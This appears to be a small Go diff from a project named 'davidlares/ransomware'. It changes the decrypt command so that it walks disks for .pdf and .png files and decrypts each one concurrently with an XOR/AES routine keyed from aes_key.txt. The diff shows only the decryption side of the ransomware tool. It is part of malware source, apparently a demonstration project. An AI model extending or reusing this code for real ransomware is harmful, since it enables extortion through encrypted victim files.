@@ -3,7 +3,6 @@ package cmd
 import (
 	"davidlares/ransomware/decrypt"
 	"davidlares/ransomware/mapper"
-	"fmt"
 
 	"github.com/spf13/cobra"
 )
@@ -21,10 +20,11 @@ var decryptCmd = &cobra.Command{
 		for _, disk := range disk {
 			files := mapper.MapFiles(disk, []string{".pdf", ".png"})
 			for _, file := range files {
-				fmt.Println("Found files")
+				// adding to waitgroup
+				mapper.Wg.Add(1)
 				// decrypt control
 				decryptControl <- struct{}{}
-				decrypt.DecryptWithXorAndAES(file, "aes_key.txt", decryptControl)
+				go decrypt.DecryptWithXorAndAES(file, "aes_key.txt", decryptControl)
 			}
 		}
 		mapper.Wg.Wait()
